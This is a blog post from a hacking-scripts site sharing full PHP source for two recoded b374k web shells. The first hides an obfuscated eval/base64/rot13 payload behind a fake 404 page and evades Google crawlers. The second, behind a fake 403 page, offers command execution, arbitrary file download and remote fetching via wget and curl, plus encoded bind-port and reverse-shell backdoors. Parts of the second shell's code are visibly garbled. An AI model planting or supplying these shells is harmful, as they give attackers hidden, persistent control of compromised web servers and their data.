---
id: 161
title: Web Shell b374k
author: admin
layout: post
guid: http://hackingscripts.com/?p=161
permalink: /web-shell-b374k/
categories:
  - b374k web shell
  - FilesMan
tags:
  - b374k web shell
  - PHP
---
Many thanks to x&#8217;1n73ct for recoding this b374k Web Shell.

<pre class="brush: php; title: ; notranslate" title="">&lt;?php

/* (Web Shell b374k r3c0d3d by x'1n73ct|default pass:"1n73ction") */
$auth_pass = "9c80a1eaca699e2fc6b994721f8703bc";
$color = "#00ff00";
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
header('HTTP/1.0 404 Not Found');
exit;
}
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', '2.1');
if( get_magic_quotes_gpc() ) {
function stripslashes_array($array) {
return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
}
$_POST = stripslashes_array($_POST);
}
function printLogin() {
?&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache Server at &lt;?=$_SERVER['HTTP_HOST']?&gt; Port 80&lt;/address&gt;
&lt;style&gt;
input { margin:0;background-color:#fff;border:1px solid #fff; }
&lt;/style&gt;
&lt;center&gt;
&lt;form method=post&gt;
&lt;input type=password name=pass&gt;
&lt;/form&gt;&lt;/center&gt;
&lt;?php
exit;
}
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
if( empty( $auth_pass ) ||
( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) )
$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
else
printLogin();
function x($inject){eval("\$z=gz" . "inf" . "la" . "te(s" . "t" . "r_r" . "ot" . "13(ba" . "se" . "6" . "4" . "_" . "d" . "e" . "c" . "o" . "de(st" . "r" . "_" . "r" . "o" . "t" . "13(" . "gzi" . "nf" . "lat" . "e(" . "bas" . "e6" . "4_d" . "ec" . "ode(\$inject))))));eval(\$z);");}
x("BcFLEkMwAADQA3UR41PtoosYVDCToE3ETklHQv1L3b7v+dTA5E1Vmj3lKq8JUnbFArMm3x6w0SsfmthiFIfpAOZJea99h9vY3n25Av/JpM4TuogsP7sYt/kWd63yMUoIFnpJcBE6OyxpNFWNDAIewUZ+Mupm1pqiuGI9P4aC71blFMl0TLOLF8YFtIbI6HB4DNA2wSKVPGnsAkRdm+7v9gc=");
?&gt;
</pre>

..and another b374k shell recoded by BlackShadow:

<pre class="brush: php; title: ; notranslate" title="">&lt;?php error_reporting(0);
@set_time_limit(0);
@session_start();
// configuration
$xSoftware = trim(getenv("SERVER_SOFTWARE"));
// server name
$xServerName = $_SERVER["HTTP_HOST"];
$xName = "Blackshadow";
$masukin = "892ab763f02795bfa28354ef1d39059f"; //cange you password (hash md5)
$nikmatin = (md5($_POST['pass']));
$crotzz = 1; // ' 0 '  no login pass
if ($nikmatin == $masukin) {
    $_SESSION['login'] = "$nikmatin";
}
if ($crotzz) {
    if (!isset($_SESSION['login']) or $_SESSION['login'] != $masukin) {
        die("
		
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;403 Forbidden&lt;/title&gt;
    &lt;style type=\"text/css\"&gt;
	input{
	margin:0;
	background-color:#fff;
	border:1px solid #fff;
	}
    &lt;/style&gt;
   &lt;H1&gt;Forbidden&lt;/H1&gt;
  &lt;/head&gt;
  &lt;body&gt;
&lt;p&gt;You don't have permission to access on this server.&lt;/P&gt;
&lt;hr&gt;
&lt;address&gt;" . trim(getenv("SERVER_SOFTWARE")) . " Server at " . $_SERVER['HTTP_HOST'] . "  Port 80&lt;/address&gt;
	&lt;center&gt;&lt;form method=\"post\"&gt;
        &lt;input type=\"password\" name=\"pass\"&gt;
      &lt;/form&gt;&lt;/center&gt;
  &lt;/body&gt;
&lt;/html&gt;
            ");
    }
}
if (isset($_GET['dl']) && ($_GET['dl'] != "")) {
    $file = $_GET['dl'];
    $filez = @file_get_contents($file);
    header("Content-type: application/octet-stream");
    header("Content-length: " . strlen($filez));
    header("Content-disposition: attachment; filename=\"" . basename($file) . "\";");
    echo $filez;
    exit;
} elseif (isset($_GET['dlgzip']) && ($_GET['dlgzip'] != "")) {
    $file = $_GET['dlgzip'];
    $filez = gzencode(@file_get_contents($file));
    header("Content-Type:application/x-gzip
");
    header("Content-length: " . strlen($filez));
    header("Content-disposition: attachment; filename=\"" . basename($file) . ".gz\";");
    echo $filez;
    exit;
}
if (isset($_GET['img'])) {
    @ob_clean();
    $d = magicboom($_GET['y']);
    $f = $_GET['img'];
    $inf = @getimagesize($d . $f);
    $ext = explode($f, ".");
    $ext = $ext[count($ext) - 1];
    @header("Content-type: " . $inf["mime"]);
    @header("Cache-control: public");
    @header("Expires: " . date("r", mktime(0, 0, 0, 1, 1, 2030)));
    @header("Cache-control: max-age=" . (60 * 60 * 24 * 7));
    @readfile($d . $f);
    exit;
}
$ver = "1.01";
$software = getenv("SERVER_SOFTWARE");
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") $safemode = TRUE;
else $safemode = FALSE;
$system = @php_uname();
if (strtolower(substr($system, 0, 3)) == "win") $win = TRUE;
else $win = FALSE;
if (isset($_GET['y'])) {
    if (@is_dir($_GET['view'])) {
        $pwd = $_GET['view'];
        @chdir($pwd);
    } else {
        $pwd = $_GET['y'];
        @chdir($pwd);
    }
}
if (!$win) {
    if (!$user = rapih(exe("whoami"))) $user = "";
    if (!$id = rapih(exe("id"))) $id = "";
    $prompt = $user . " \$ ";
    $pwd = @getcwd() . DIRECTORY_SEPARATOR;
} else {
    $user = @get_current_user();
    $id = $user;
    $prompt = $user . " &gt;";
    $pwd = realpath(".") . "\"; $v = explode("\",$d); $v = $v[0]; foreach (range("A","Z") as $letter) { $bool = @is_dir($letter.":
        \"); if ($bool) { $letters .= " &lt; ahref = \"?y=" . $letter . ":\"&gt;[ ";
        if ($letter . ":" != $v) {
            $letters.= $letter;
        } else {
            $letters.= "&lt;span class=\"gaya\"&gt;" . $letter . "&lt;/span&gt;";
        }
        $letters.= " ]&lt;/a&gt; ";
    }
}
}
if (function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
else $posix = FALSE;
$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
$my_ip = $_SERVER['REMOTE_ADDR'];
$bindport = "13123";
$bindport_pass = "b374k";
$pwds = explode(DIRECTORY_SEPARATOR, $pwd);
$pwdurl = "";
for ($i = 0;$i &lt; sizeof($pwds) - 1;$i++) {
    $pathz = "";
    for ($j = 0;$j &lt;= $i;$j++) {
        $pathz.= $pwds[$j] . DIRECTORY_SEPARATOR;
    }
    $pwdurl.= "&lt;a href=\"?y=" . $pathz . "\"&gt;" . $pwds[$i] . " " . DIRECTORY_SEPARATOR . " &lt;/a&gt;";
}
if (isset($_POST['rename'])) {
    $old = $_POST['oldname'];
    $new = $_POST['newname'];
    @rename($pwd . $old, $pwd . $new);
    $file = $pwd . $new;
}
$buff = $software . "&lt;br /&gt;";
$buff.= $system . "&lt;br /&gt;";
if ($id != "") $buff.= $id . "&lt;br /&gt;";
$buff.= "server ip : " . $server_ip . " &lt;span class=\"gaya\"&gt;|&lt;/span&gt; your ip : " . $my_ip . "&lt;br /&gt;";
if ($safemode) $buff.= "safemode &lt;span class=\"gaya\"&gt;ON&lt;/span&gt;&lt;br /&gt;";
else $buff.= "safemode &lt;span class=\"gaya\"&gt;OFF&lt;span&gt;&lt;br /&gt;";
if ('' == ($df = @ini_get('disable_functions'))) $buff.= "Disable_functions :&lt;span class=\"df\"&gt;NONE&lt;/span&gt;&lt;br /&gt;";
else $buff.= "Disable_functions : &lt;span class=\"df\"&gt;$df&lt;span&gt;&lt;br /&gt;";
$buff.= $letters . "&nbsp;Dir :&nbsp;" . $pwdurl;
function rapih($text) {
    return trim(str_replace("&lt;br /&gt;", "", $text));
}
function magicboom($text) {
    if (!get_magic_quotes_gpc()) {
        return $text;
    }
    return stripslashes($text);
}
function showdir($pwd, $prompt) {
    $fname = array();
    $dname = array();
    if (function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
    else $posix = FALSE;
    $user = "????:????";
    if ($dh = opendir($pwd)) {
        while ($file = readdir($dh)) {
            if (is_dir($file)) {
                $dname[] = $file;
            } elseif (is_file($file)) {
                $fname[] = $file;
            }
        }
        closedir($dh);
    }
    sort($fname);
    sort($dname);
    $path = @explode(DIRECTORY_SEPARATOR, $pwd);
    $tree = @sizeof($path);
    $parent = "";
    $buff = " &lt;form action=\"?y=" . $pwd . "&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\"&gt; &lt;table class=\"cmdbox\" style=\"width:50%;\"&gt; &lt;tr&gt;&lt;td&gt;$prompt&lt;/td&gt;&lt;td&gt;&lt;input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" /&gt;&lt;input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/form&gt; &lt;form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;tr&gt;&lt;td&gt;view file/folder&lt;/td&gt;&lt;td&gt;&lt;input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"" . $pwd . "\" /&gt;&lt;input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/form&gt;&lt;/table&gt;&lt;table class=\"explore\"&gt; &lt;tr&gt;&lt;th&gt;name&lt;/th&gt;&lt;th style=\"width:80px;\"&gt;size&lt;/th&gt;&lt;th style=\"width:210px;\"&gt;owner:group&lt;/th&gt;&lt;th style=\"width:80px;\"&gt;perms&lt;/th&gt;&lt;th style=\"width:110px;\"&gt;modified&lt;/th&gt;&lt;th style=\"width:190px;\"&gt;actions&lt;/th&gt;&lt;/tr&gt; ";
    if ($tree &gt; 2) for ($i = 0;$i &lt; $tree - 2;$i++) $parent.= $path[$i] . DIRECTORY_SEPARATOR;
    else $parent = $pwd;
    foreach ($dname as $folder) {
        if ($folder == ".") {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
            } else {
                $owner = $user;
            }
            $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "\"&gt;$folder&lt;/a&gt;&lt;/td&gt;&lt;td&gt;LINK&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($pwd) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($pwd)) . "&lt;/td&gt;&lt;td&gt;&lt;span id=\"titik1\"&gt;&lt;a href=\"?y=$pwd&amp;edit=" . $pwd . "newfile.php\"&gt;newfile&lt;/a&gt; | &lt;a href=\"javascript:tukar('titik1','titik1_form');\"&gt;newfolder&lt;/a&gt;&lt;/span&gt; &lt;form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" /&gt; &lt;/form&gt;&lt;/td&gt;&lt;/tr&gt; ";
        } elseif ($folder == "..") {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
            } else {
                $owner = $user;
            }
            $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $parent . "\"&gt;$folder&lt;/a&gt;&lt;/td&gt;&lt;td&gt;LINK&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($parent) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($parent)) . "&lt;/td&gt;&lt;td&gt;&lt;span id=\"titik2\"&gt;&lt;a href=\"?y=$pwd&amp;edit=" . $parent . "newfile.php\"&gt;newfile&lt;/a&gt; | &lt;a href=\"javascript:tukar('titik2','titik2_form');\"&gt;newfolder&lt;/a&gt;&lt;/span&gt; &lt;form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" /&gt; &lt;/form&gt; &lt;/td&gt;&lt;/tr&gt;";
        } else {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
            } else {
                $owner = $user;
            }
            $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a id=\"" . clearspace($folder) . "_link\" href=\"?y=" . $pwd . $folder . DIRECTORY_SEPARATOR . "\"&gt;[ $folder ]&lt;/a&gt; &lt;form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($folder) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"oldname\" value=\"" . $folder . "\" style=\"margin:0;padding:0;\" /&gt; &lt;input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $folder . "\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($folder) . "_form','" . clearspace($folder) . "_link');\" /&gt; &lt;/form&gt; &lt;td&gt;DIR&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($pwd . $folder) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($folder)) . "&lt;/td&gt;&lt;td&gt;&lt;a href=\"javascript:tukar('" . clearspace($folder) . "_link','" . clearspace($folder) . "_form');\"&gt;rename&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;fdelete=" . $pwd . $folder . "\"&gt;delete&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
        }
    }
    foreach ($fname as $file) {
        $full = $pwd . $file;
        if (!$win && $posix) {
            $name = @posix_getpwuid(@fileowner($file));
            $group = @posix_getgrgid(@filegroup($file));
            $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
        } else {
            $owner = $user;
        }
        $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a id=\"" . clearspace($file) . "_link\" href=\"?y=$pwd&amp;view=$full\"&gt;$file&lt;/a&gt; &lt;form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($file) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"oldname\" value=\"" . $file . "\" style=\"margin:0;padding:0;\" /&gt; &lt;input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $file . "\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\" /&gt; &lt;/form&gt; &lt;/td&gt;&lt;td&gt;" . ukuran($full) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($full) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($full)) . "&lt;/td&gt; &lt;td&gt;&lt;a href=\"?y=$pwd&amp;edit=$full\"&gt;edit&lt;/a&gt; | &lt;a href=\"javascript:tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\"&gt;rename&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;delete=$full\"&gt;delete&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;dl=$full\"&gt;download&lt;/a&gt;&nbsp;(&lt;a href=\"?y=$pwd&amp;dlgzip=$full\"&gt;gzip&lt;/a&gt;)&lt;/td&gt;&lt;/tr&gt;";
    }
    $buff.= "&lt;/table&gt;";
    return $buff;
}
function ukuran($file) {
    if ($size = @filesize($file)) {
        if ($size &lt;= 1024) return $size;
        else {
            if ($size &lt;= 1024 * 1024) {
                $size = @round($size / 1024, 2);;
                return "$size kb";
            } else {
                $size = @round($size / 1024 / 1024, 2);
                return "$size mb";
            }
        }
    } else return "???";
}
function exe($cmd) {
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('exec')) {
        @exec($cmd, $results);
        $buff = "";
        foreach ($results as $result) {
            $buff.= $result;
        }
        return $buff;
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('shell_exec')) {
        $buff = @shell_exec($cmd);
        return $buff;
    }
}
function tulis($file, $text) {
    $textz = gzinflate(base64_decode($text));
    if ($filez = @fopen($file, "w")) {
        @fputs($filez, $textz);
        @fclose($file);
    }
}
function ambil($link, $file) {
    if ($fp = @fopen($link, "r")) {
        while (!feof($fp)) {
            $cont.= @fread($fp, 1024);
        }
        @fclose($fp);
        $fp2 = @fopen($file, "w");
        @fwrite($fp2, $cont);
        @fclose($fp2);
    }
}
function which($pr) {
    $path = exe("which $pr");
    if (!empty($path)) {
        return trim($path);
    } else {
        return trim($pr);
    }
}
function download($cmd, $url) {
    $namafile = basename($url);
    switch ($cmd) {
        case 'wwget':
            exe(which('wget') . " " . $url . " -O " . $namafile);
        break;
        case 'wlynx':
            exe(which('lynx') . " -source " . $url . " &gt; " . $namafile);
        break;
        case 'wfread':
            ambil($wurl, $namafile);
        break;
        case 'wfetch':
            exe(which('fetch') . " -o " . $namafile . " -p " . $url);
        break;
        case 'wlinks':
            exe(which('links') . " -source " . $url . " &gt; " . $namafile);
        break;
        case 'wget':
            exe(which('GET') . " " . $url . " &gt; " . $namafile);
        break;
        case 'wcurl':
            exe(which('curl') . " " . $url . " -o " . $namafile);
        break;
        default:
        break;
    }
    return $namafile;
}
function get_perms($file) {
    if ($mode = @fileperms($file)) {
        $perms = '';
        $perms.= ($mode & 00400) ? 'r' : '-';
        $perms.= ($mode & 00200) ? 'w' : '-';
        $perms.= ($mode & 00100) ? 'x' : '-';
        $perms.= ($mode & 00040) ? 'r' : '-';
        $perms.= ($mode & 00020) ? 'w' : '-';
        $perms.= ($mode & 00010) ? 'x' : '-';
        $perms.= ($mode & 00004) ? 'r' : '-';
        $perms.= ($mode & 00002) ? 'w' : '-';
        $perms.= ($mode & 00001) ? 'x' : '-';
        return $perms;
    } else return "??????????";
}
function clearspace($text) {
    return str_replace(" ", "_", $text);
}
$port_bind_bd_c = "bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jv f+fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQr?J EP/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41Z ZdKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6V L3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVK?u gUq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpX kHDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J?4 WtyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsU LZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYu?k 6uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf";
$port_bind_bd_pl = "ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr 1NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzf?w gtNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQk De/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM 0LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRr?V ovaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjG B+hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=";
$back_connect = "fZFRS8MwF IXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0StktGB8aihs prPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28jS2whVulCf lCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZja3ImclYa gh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw Tskvpd92 +rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==";
$back_connect_c = "XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29r WhyEzc+Z2TjpSserABYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl9?5 /3Wa43fpotyCABR95zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vK C1rI6wgSmN/niYb75i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVC nim7a/ZuJC0JTwf3ARkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlx iuPB3E0/gXejiHMcYjwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3X Ie1bxKw77YTyt6T2F 6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==";
$domain = "bVNRj6IwEH434T/MVZPCxaPuPSpw+3DZf3BPxjMVBmm2UNLWRW/jf79ScHV1gRKmM/PN12+GWbFY1JDCcykkhoShzVnDayziXDUliVbBJJiIMvw26wOjYPIeTAqBEBLIeUMtaOQFfJV2DiYoDfb5LgfzSgFJLN9JhFxyY1JaqJqLhnIp9k1Kc2wsagpZYovst3eZhLnv3v5jUF8tc6qlaF7BbxBXq1SORl6FniRwAzOHHb2P3FHjXoTkn2qQzL1ncLVuf1tzm1dbLmVIp30EkDD+HpEpnXuQ4W06MyhRyoOpwg9VjNUSm9BqUYdj3Ppps15soggy+DmUmR0ceSdxq4w4bvdo2+4gitArrroG9Sj7mxOCGzSMxHdYvpyHMsKig/KQa9orTjcwup9HWRwcmRNnMK2UHVv4kXmLPHhET44KTUdTelPS8ZAQXnVy0PFfl8AGHa8UQWl4CJOPYcMAXciQpBBvYOxJYkohV1LpJUxfXhbughVYPNofpuKF6pawaI9+PbmlsVgBze50iknCHJ4fiPMgyTB1wSSxOuvtfnjcu696nUGaJRws164zKd3uJG9eKVQay7Sytl0y1nVd/FCL9eX7c8TEzSHPwOEyDz8WulTY8xOnbtuF33YtJp8SLvfIkA8E6KWLrFI1sgcI1h52UuTbytaS3p/h5jfh2Wd2zOkBZJyb25k+3zy/sv8=";
?&gt; 
&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt; &lt;script type="text/javascript"&gt; function tukar(lama,baru){ document.getElementById(lama).style.display = 'none'; document.getElementById(baru).style.display = 'block'; } &lt;/script&gt; &lt;style type="text/css"&gt; 
body{ background:#000000; } a { text-decoration:none; } a:hover{
	border-bottom-width: 1px;
	border-bottom-style: solid;
	border-bottom-color: #990000;
} *{ font-size:11px; font-family:Tahoma,Verdana,Arial; color:#FFFFFF; } #menu{
	margin-top: 8px;
	margin-right: 6px;
	margin-bottom: 2px;
	margin-left: 2px;
	background-color: #990000;
	height: 24px;
} #menu a{
	margin:0;
	background:#222222;
	text-decoration:none;
	letter-spacing:2px;
	font-family: tahoma, verdana, Arial;
	color: #CC0000;
	padding-top: 4px;
	padding-right: 12px;
	padding-bottom: 6px;
	padding-left: 18px;
} #menu a:hover{ background:#191919; border-bottom:1px solid #333333; border-top:1px solid #333333; } .tabnet{
	margin:15px auto 0 auto;
	border: 1px solid #333333;
	color: #FFCC00;
} .main {
	width:97%;
	margin:30px auto 10px;
	padding:10px 10px 5px 10px;
	border-radius:5px;
-moz-border-radius:5px; -moz-box-shadow:0px 0px 10px #990000; -webkit-box-shadow:0px 0px 5px #990000;	background-color: #000000;
} 
.domain {
	color: #CC0000;
	border: 1px solid #990000;
}
.gaya { color: #CC0000; }
.df {
	color: #CC0000;
	font-family: tahoma, verdana, Arial;
}
 .gaya a { color: #CC0000; } .inputz{ background:#111111; border:0; padding:2px; border-bottom:1px solid #222222; border-top:1px solid #222222; } .inputzbut{ background:#111111; color:#CC0000; margin:0 4px; border:1px solid #444444; cursor:pointer;} .inputz:hover, .inputzbut:hover{ border-bottom:1px solid #CC0000; border-top:1px solid #CC0000; } .output { margin:auto; border:1px solid #CC0000; width:100%; height:400px; background:#000000; padding:0 2px; } .cmdbox{ width:100%; } .head_info{ padding: 0 4px; } .b1{ font-size:30px; padding:0; color:#444444; } .b2{ font-size:30px; padding:0; color: #333333; } .b_tbl{ text-align:center; margin:0 4px 0 0; padding:0 4px 0 0; border-right:1px solid #333333; } .phpinfo table{ width:100%; padding:0 0 0 0; } .phpinfo td{ background:#111111; color:#cccccc; padding:6px 8px;; } .phpinfo th, th{ background:#191919; border-bottom:1px solid #333333; font-weight:normal; } .phpinfo h2, .phpinfo h2 a{ text-align:center; font-size:16px; padding:0; margin:30px 0 0 0; background:#222222; padding:4px 0; } .explore{ width:100%; } .explore a { text-decoration:none; } .explore td{ border-bottom:1px solid #333333; padding:0 8px; line-height:24px; } .explore th{ padding:3px 8px; font-weight:normal; } .explore th:hover , .phpinfo th:hover{ border-bottom:1px solid #CC0000; } .explore tr:hover{
	cursor:pointer;
	background-color: #990000;
} .viewfile{ background:#EDECEB; color:#000000; margin:4px 2px; padding:8px; } .sembunyi{ display:none; padding:0;margin:0;} .info{ background:#111111; width:99%; padding:5px; margin:10px auto 5px; text-align:center; font-size:13px;} .info a{ font-size:14px;} .info span{ font-size:14px;} .jaya{ margin:5px; text-align:right; }
&lt;/style&gt; 
&lt;/head&gt; &lt;body onLoad="document.getElementById('cmd').focus();"&gt; &lt;div class="main"&gt; &lt;!-- head info start here --&gt; &lt;div class="head_info"&gt; &lt;table&gt;
  &lt;tr&gt; &lt;td rowspan="2"&gt;&lt;table class="b_tbl"&gt;&lt;tr&gt;&lt;td&gt;&lt;a href="?"&gt;&lt;span class="b1"&gt;&lt;img src="http://spyr00t.tk/wp-content/themes/nothingsecure/images/indonesianblackhat.png" width="319" height="100" border="0"&gt;&lt;/span&gt;&lt;/a&gt;&lt;/td&gt;
  &lt;/tr&gt;&lt;tr&gt;
    &lt;td&gt;&lt;span class="gaya"&gt;&lt;?php echo $xName; ?&gt;&lt;/span&gt;  Indonesian Blackhat &lt;/td&gt;
  &lt;/tr&gt;&lt;/table&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $buff; ?&gt;&lt;br/&gt;&lt;/td&gt; 
  &lt;/tr&gt;
  &lt;tr&gt;
    
  &lt;/tr&gt;
&lt;/table&gt; 
&lt;/div&gt; &lt;!-- head info end here --&gt;

